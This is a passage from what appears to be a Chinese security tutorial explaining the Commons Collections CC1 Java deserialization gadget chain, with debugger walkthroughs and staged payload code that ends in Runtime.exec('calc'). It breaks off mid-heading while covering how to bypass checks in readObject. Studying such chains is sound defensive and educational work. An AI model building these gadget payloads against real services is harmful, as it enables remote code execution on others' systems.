EntrySet 的构造方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public Set entrySet() &#123;</span><br><span class="line">    return (Set)(this.isSetValueChecking() ? new EntrySet(this.map.entrySet(), this) : this.map.entrySet());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是到这里还有个问题，获得 EntrySet 对象后怎么去调用它的 iterator 方法呢，以及获得 EntrySetIterator 对象后怎么去调用它的 next 方法呢，这个可以通过增强 for 循环遍历 map 来实现访问。</p><h4 id="增强-for-循环遍历-map-的底层原理"><a href="#增强-for-循环遍历-map-的底层原理" class="headerlink" title="增强 for 循环遍历 map 的底层原理"></a>增强 for 循环遍历 map 的底层原理</h4><p><code>for (Map.Entry&lt;String, Integer&gt; entry : map.entrySet())</code> 实际上相当于以下的迭代器实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Iterator&lt;Map.Entry&lt;String, Integer&gt;&gt; iterator = map.entrySet().iterator();</span><br><span class="line">while (iterator.hasNext()) &#123;</span><br><span class="line">    Map.Entry&lt;String, Integer&gt; entry = iterator.next();</span><br><span class="line">    // 循环体内的代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依此道理，如果将 map 赋值为 AbstractInputCheckedMapDecorator 抽象类的子类，</p><p>那么调用 map.entrySet() 方法时，实际上调用的是 AbstractInputCheckedMapDecorator 抽象类中实现的 entrySet() 方法，这个 entrySet() 方法会返回一个 EntrySet 对象，</p><p>那么 map.entrySet().iterator() 实际上调用的是 EntrySet 对象的 iterator 方法，而这个方法返回的是一个 EntrySetIterator 对象，</p><p>那么在接下来的 while 循环中调用的 iterator.next() 方法其实就是 EntrySetIterator 对象的 next() 方法，这个方法会调用 MapEntry 的构造方法，返回一个 MapEntry 对象，</p><p>最终 <code>for (Map.Entry&lt;String, Integer&gt; entry : map.entrySet())</code> 这个增强 for 获取到的 entry 就是一个 MapEntry 对象，</p><p>最后的最后，我们手动调用这个 entry 的 setValue 方法即可。</p><p>至此，整条链子就串联起来了。</p><h4 id="写个程序实现上面的利用链"><a href="#写个程序实现上面的利用链" class="headerlink" title="写个程序实现上面的利用链"></a>写个程序实现上面的利用链</h4><h6 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h6><p>下面的代码运行后会弹出计算器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public class Demo2 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        InvokerTransformer invokerTransformer =</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">                </span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(&quot;key&quot;, &quot;value&quot;);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedmap = TransformedMap.decorate(map, null, invokerTransformer);</span><br><span class="line">        </span><br><span class="line">        for (Map.Entry entry : transformedmap.entrySet()) &#123;</span><br><span class="line">            entry.setValue(runtime);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="通过调试来理解其中逻辑"><a href="#通过调试来理解其中逻辑" class="headerlink" title="通过调试来理解其中逻辑"></a>通过调试来理解其中逻辑</h6><p>Java 代码有一个特点，Java 的实例方法调用是基于运行时的实际类型的动态调用，而非变量的声明类型，这就是 Java 的多态性。</p><p>也因此，只有当程序运行起来才知道某个方法调用的究竟是哪个类的方法。所以说：调试是学习过程中必不可少的一环。</p><p>前面的逻辑应该都好理解，直接在最后一个 for 循环和 setValue 处下断点：</p><img src="/images/image-20240504161343935.png"><p>开始调试，单步进入：</p><img src="/images/image-20240504161514692.png"><p>此时来到了 AbstractInputCheckedMapDecorator 抽象类的 entrySet 方法，不过严格来说，应该是调用了 TransformedMap 的 entrySet 方法（因为 TransformedMap 继承了 AbstractInputCheckedMapDecorator 抽象类，拥有了它的所有方法，所以 TransformedMap 中其实是有 entrySet 方法的，只不过在代码上看不到）</p><p><strong>所以一个很重要的点是，这里的 this 指代的是谁？指代的是 AbstractInputCheckedMapDecorator 吗？不对，指代的是 TransformedMap 对象，一定记住，因为后续会将这个值层层传递下去。</strong> </p><p>继续单步进入：</p><img src="/images/image-20240504161935980.png"><p>此时来到了 TransformedMap 重写的 isSetValueChecking 方法，由于 valueTransformer 已经被赋值，所以这里应当返回 true 。</p><p>继续单步进入：</p><img src="/images/image-20240504162201258.png"><p>由于上一步返回 true ，所以这里应当会调用 EntrySet 的构造方法。</p><p>继续单步进入：</p><img src="/images/image-20240504162305515.png"><p>调用了 EntrySet 的构造方法，并传入一个 TransformedMap 对象给 EntrySet 的私有属性 parent 赋值。</p><p>这里可以不用看了，直接 step out 跳出：</p><img src="/images/image-20240504162449686.png"><p>回到 entrySet 成员方法这里，此时应当返回一个 EntrySet 对象。</p><p>继续单步进入：</p><img src="/images/image-20240504162533758.png"><p>此时回到初始代码，准备开始 for 循环。</p><p>继续单步进入：</p><img src="/images/image-20240504162632352.png"><p>此时来到了 EntrySet 的 iterator 方法，获取 EntrySetIterator 对象。</p><p>继续单步进入，选择查看 EntrySetIterator 构造方法：</p><img src="/images/image-20240504162802621.png"><p>构造方法中将 EntrySet 的 parent 传了过来，赋值给了自己的私有属性 parent ，此时它是一个 TransformedMap 对象。</p><p>这里可以不用看了，直接 step out 跳出：</p><img src="/images/image-20240504163016036.png"><p>回到迭代器这里，这个方法将会返回一个 EntrySetIterator 对象。</p><p>继续单步进入：</p><img src="/images/image-20240504163117017.png"><p>回到了初始代码。</p><p>继续单步进入：</p><img src="/images/image-20240504163155507.png"><p>开始进行 hasNext 判断，因为是第一次遍历，集合中有值，这里应当返回 true 。</p><p>继续单步进入：</p><img src="/images/image-20240504163317122.png"><p>回到了初始代码。</p><p>继续单步进入：</p><img src="/images/image-20240504163347920.png"><p>此时来到了 EntrySetIterator 的 next 方法。</p><p>第一步可以不用看，直接 step over 进入下一步，再单步进入：</p><img src="/images/image-20240504163550283.png"><p>此时来到了 MapEntry 的构造方法，将 EntrySetIterator 的 parent 值传给了自己的私有属性 parent ，此时它是一个 TransformedMap 对象。</p><p>接下来可以不用看了，step out 跳出构造方法，再跳出 EntrySetIterator 的 next 方法，回到初始代码这里：</p><img src="/images/image-20240504163849962.png"><p>此时的 entry 是一个 MapEntry 对象，单步进入它的 setValue 方法：</p><img src="/images/image-20240504164026799.png"><p>接下来会进入 this.parent 的 checkSetValue 方法，如上所言，this.parent 应当指代的是 TransformedMap 对象，那么接下来会调用这个 TransformedMap 对象的 checkSetValue 方法，单步进入看看：</p><img src="/images/image-20240504165625348.png"><p>没问题，接下来会调用 valueTransformer 的 transform 方法，valueTransformer 已经被赋值为一个 InvokerTransformer 对象，接下来将会调用 InvokerTransformer 的 transform 方法。</p><p>单步进入：</p><img src="/images/image-20240504165945559.png"><p>这个 InvokerTransformer 对象也已经被初始化，前面的 setValue 的参数 runtime 传递给了 checkSetValue ，最后又传递给了 transform ，所以这里的 input 参数应当是一个 Runtime 对象。</p><p>到这里就可以直接下一步下一步了，执行完 method.invoke 就会弹出计算器：</p><img src="/images/image-20240504170319433.png"><p>好了，后面的就不调了。通过这次调试，想必逻辑大致能理清楚了。</p><h4 id="反序列化利用"><a href="#反序列化利用" class="headerlink" title="反序列化利用"></a>反序列化利用</h4><p>作为一条反序列化利用链，最终还是要归到 readObject 这里，毕竟实际情况下 setValue 可不是我们自己能手动调用的，所以我们要找谁的 readObject 方法里调用了 setValue 。</p><p>AnnotationInvocationHandler 类的 readObject 方法里就调用了 setValue 。</p><h5 id="入口类-AnnotationInvocationHandler"><a href="#入口类-AnnotationInvocationHandler" class="headerlink" title="入口类 AnnotationInvocationHandler"></a>入口类 AnnotationInvocationHandler</h5><p>看看 readObject 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">    var1.defaultReadObject();</span><br><span class="line">    AnnotationType var2 = null;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        var2 = AnnotationType.getInstance(this.type);</span><br><span class="line">    &#125; catch (IllegalArgumentException var9) &#123;</span><br><span class="line">        throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map var3 = var2.memberTypes();</span><br><span class="line">    Iterator var4 = this.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">    while(var4.hasNext()) &#123;</span><br><span class="line">        Map.Entry var5 = (Map.Entry)var4.next();</span><br><span class="line">        String var6 = (String)var5.getKey();</span><br><span class="line">        Class var7 = (Class)var3.get(var6);</span><br><span class="line">        if (var7 != null) &#123;</span><br><span class="line">            Object var8 = var5.getValue();</span><br><span class="line">            if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123;</span><br><span class="line">                var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有没有发现跟前面增强 for 循环的底层原理有几分神似？如果没有发现的话我把这一段截取出来：</p><pre><code>Iterator var4 = this.memberValues.entrySet().iterator();while(var4.hasNext()) &#123;    Map.Entry var5 = (Map.Entry)var4.next();</code></pre><p>依葫芦画瓢，我们想让这个 memberValues 变成 TransformedMap 对象，那么同理 var5 将会被赋值为一个 MapEntry 对象。在之后经过两重判断，就会调用 var5 的 setValue 了。</p><p>memberValues 是 AnnotationInvocationHandler 类中定义的一个属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private final Map&lt;String, Object&gt; memberValues;</span><br></pre></td></tr></table></figure><p>而这个属性在构造方法中被赋值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    Class[] var3 = var1.getInterfaces();</span><br><span class="line">    if (var1.isAnnotation() &amp;&amp; var3.length == 1 &amp;&amp; var3[0] == Annotation.class) &#123;</span><br><span class="line">        this.type = var1;</span><br><span class="line">        this.memberValues = var2;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是由于构造方法没有被 public 修饰（不写修饰符默认 default ），不能直接调用，所以我们用反射来获取构造方法。</p><p>在构造方法中我们也可以看到对传入的参数 var1 做了一些检查：</p><ol><li><code>var3 = var1.getInterfaces()</code>：这一行代码获取了 <code>var1</code> 类对象实现的所有接口，并将它们存储在 <code>var3</code> 数组中。</li><li><code>if (var1.isAnnotation() &amp;&amp; var3.length == 1 &amp;&amp; var3[0] == Annotation.class)</code>：这一行代码是一个条件语句，其中包含三个条件：<ul><li><code>var1.isAnnotation()</code> 检查 <code>var1</code> 是否是一个注解类型。如果 <code>var1</code> 是一个注解类型，则返回 <code>true</code>。</li><li><code>var3.length == 1</code> 检查 <code>var1</code> 实现的接口数量是否为 1。如果是，则返回 <code>true</code>。</li><li><code>var3[0] == Annotation.class</code> 检查 <code>var1</code> 实现的接口中的第一个接口是否是 <code>Annotation</code> 接口。如果是，则返回 <code>true</code>。</li></ul></li></ol><p>为了满足上述条件，我们初步选择传入 Override.class 作为 var1 的值，于是就得到了 payload1 ：</p><h6 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">public class payload1 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 获取 Runtime 对象</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line"></span><br><span class="line">        // 初始化执行类 InvokerTransformer</span><br><span class="line">        InvokerTransformer invokerTransformer =</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(&quot;key&quot;, &quot;value&quot;);</span><br><span class="line"></span><br><span class="line">        // 初始化利用链 TransformedMap</span><br><span class="line">        Map&lt;Object, Object&gt; transformedmap = TransformedMap.decorate(map, null, invokerTransformer);</span><br><span class="line"></span><br><span class="line">        // 利用反射修改入口类 AnnotationInvocationHandler 的 memberValues 属性</span><br><span class="line">        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor annotationInvocationConstructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationConstructor.setAccessible(true);</span><br><span class="line">        // 为了通过 isAnnotation 判断，选择将 Override.class 传入第一个参数</span><br><span class="line">        Object o = annotationInvocationConstructor.newInstance(Override.class, transformedmap);</span><br><span class="line"></span><br><span class="line">        // serialize(o);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先序列化再反序列化，反序列化时应当弹出计算器。但实际上什么也没发生。原因有很多，先来解决第一个。</p><h5 id="Runtime-类不能被序列化解决办法"><a href="#Runtime-类不能被序列化解决办法" class="headerlink" title="Runtime 类不能被序列化解决办法"></a>Runtime 类不能被序列化解决办法</h5><p>翻看 Runtime 类的定义，会发现它并没有实现 Serializable 接口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public class Runtime</span><br></pre></td></tr></table></figure><p>要如何解决这个问题呢？在前面的学习中我们能发现 InvokerTransformer 类的 transform 方法能够通过执行任意类的任意方法，假如我们让它执行 Runtime.class 对象的 getDeclaredMethod 方法，并将 getRuntime 作为参数传入，那么我们就能获取到 Runtime 的 getRuntime 方法了。</p><p><strong>具体代码如下：</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Method getRuntimeMethod = </span><br><span class="line">    (Method)new InvokerTransformer</span><br><span class="line">         (&quot;getDeclaredMethod&quot;,</span><br><span class="line">         new Class[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">         new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);</span><br></pre></td></tr></table></figure><p>其实就相当于这句代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Method getRuntimeMethod = Runtime.class.getDeclaredMethod(&quot;getRuntime&quot;,null)</span><br></pre></td></tr></table></figure><p>这样得到的 getRuntimeMethod 就是 Runtime 的 getRuntime 方法了。</p><p><strong>接下来我要调用 getRuntimeMethod 方法，还是通过 InvokerTransformer 类的 transform 方法来调用：</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Runtime r =</span><br><span class="line">    (Runtime) new InvokerTransformer</span><br><span class="line">         (&quot;invoke&quot;,</span><br><span class="line">         new Class[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">         new Object[]&#123;null,null&#125;).transform(getRuntimeMethod);</span><br></pre></td></tr></table></figure><p>其实就相当于这句代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime runtime = getRuntimeMethod.invoke(null, null)</span><br></pre></td></tr></table></figure><p>执行 getRuntime 方法后返回 Runtime 对象，很合理。</p><p><strong>接下来我要调用这个 Runtime 对象的 exec 方法，依然是通过 InvokerTransformer 类的 transform 方法来调用：</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(runtime);</span><br></pre></td></tr></table></figure><p>其实就相当于这句代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runtime.exec(&quot;calc&quot;)</span><br></pre></td></tr></table></figure><p>经过上面的三步操作就可以调用 exec 恶意函数了。但其实这段代码还可以再优雅一点，可以用 ChainedTransformer 类来简化操作。</p><h6 id="ChainedTransformer-类"><a href="#ChainedTransformer-类" class="headerlink" title="ChainedTransformer 类"></a>ChainedTransformer 类</h6><p><strong>利用 ChainedTransformer 可将上述三段代码简化成如下代码：</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">        new InvokerTransformer</span><br><span class="line">                (&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">        new InvokerTransformer</span><br><span class="line">                (&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">        new InvokerTransformer</span><br><span class="line">                (&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">chainedTransformer.transform(Runtime.class);</span><br></pre></td></tr></table></figure><p><strong>要了解具体原理，我们可以查看 chainedTransformer 类的构造方法：</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public ChainedTransformer(Transformer[] transformers) &#123;</span><br><span class="line">    this.iTransformers = transformers;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，构造方法中接收一个 Transformer 数组，并将这个数组赋值给 this.iTransformers 。</p><p><strong>而 iTransformers 是 ChainedTransformer 中定义的属性：</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private final Transformer[] iTransformers;</span><br></pre></td></tr></table></figure><p><strong>接着来看 chainedTransformer 类的 transform 方法：</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public Object transform(Object object) &#123;</span><br><span class="line">    for(int i = 0; i &lt; this.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = this.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>chainedTransformer 类的 transform 方法遍历 iTransformers 数组中的每一个元素并依次执行它们的 transform 方法，并将前一个 transform 方法的结果作为后一个 transform 方法的参数。</p><p>看到这里就应该大致能明白了，就是把数组中的每一个 InvokerTransformer 对象取出来再调用它们的 transform 方法，并把上一段代码的输出作为下一段代码的输入，这样就完美替代了上面的三段代码。于是我们得到 payload2：</p><h6 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">public class payload2 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 获取包含执行类 InvokerTransformer 的 ChainedTransformer 对象</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        </span><br><span class="line">        // 随便构造一个 Map 对象作为 TransformedMap.decorate 的参数</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(&quot;key&quot;, &quot;value&quot;);</span><br><span class="line">        </span><br><span class="line">        // 初始化利用链 TransformedMap</span><br><span class="line">        Map&lt;Object, Object&gt; transformedmap = TransformedMap.decorate(map, null, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        // 利用反射修改入口类 AnnotationInvocationHandler 的 memberValues 属性</span><br><span class="line">        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor annotationInvocationConstructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationConstructor.setAccessible(true);</span><br><span class="line">        // 为了通过 isAnnotation 判断，选择将 Override.class 传入第一个参数</span><br><span class="line">        Object o = annotationInvocationConstructor.newInstance(Override.class, transformedmap);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        // unserialize(&quot;ser.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload2 解决了 Runtime 类不能被序列化的问题，在序列化时，由于 ChainedTransformer 的 transform 方法并没有被执行，所以并没有生成 Runtime 对象，只有在反序列化 readObject 时才被执行。</p><p>但是 payload2 还是无法使用，这是因为 AnnotationInvocationHandler 类的 readObject 方法中的最后一个 while 循环中还有两个判断没绕过，以及 var5 的 setValue 方法的参数还没有作控制。</p><h5 id="判断绕过"><a href="#判断绕过" class="headerlink" title="判断绕过"></a>判断绕过</h5><h6 id="这里再贴一下-AnnotationInvocationHandler-类的-readObject-方法："><a href="#这里再贴一下-AnnotationInvocationHandler-类的-readObject-方法：" class="headerlink" title="这里再贴一下 AnnotationInvocationHandler 类的 readObject 方法："></a>这里再贴一下 AnnotationInvocationHandler 类的 readObject 方法：</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">    var1.defaultReadObject();</span><br><span class="line">    AnnotationType var2 = null;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        var2 = AnnotationType.getInstance(this.type);</span><br><span class="line">    &#125; catch (IllegalArgumentException var9) &#123;</span><br><span class="line">        throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map var3 = var2.memberTypes();</span><br><span class="line">    Iterator var4 = this.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">    while(var4.hasNext()) &#123;</span><br><span class="line">        Map.Entry var5 = (Map.Entry)var4.next();</span><br><span class="line">        String var6 = (String)var5.getKey();</span><br><span class="line">        Class var7 = (Class)var3.get(var6);</span><br><span class="line">        if (var7 != null) &#123;</span><br><span class="line">            Object var8 = var5.getValue();</span><br><span class="line">            if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123;</span><br><span class="line">                var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="第一重判断-if-var7-null-绕过"><a href="#第一重判断-if-var7-null-绕过" class="headerlink" title="第一重判断 if (var7 != null)  绕过"></a>第一重判断 <code>if (var7 != 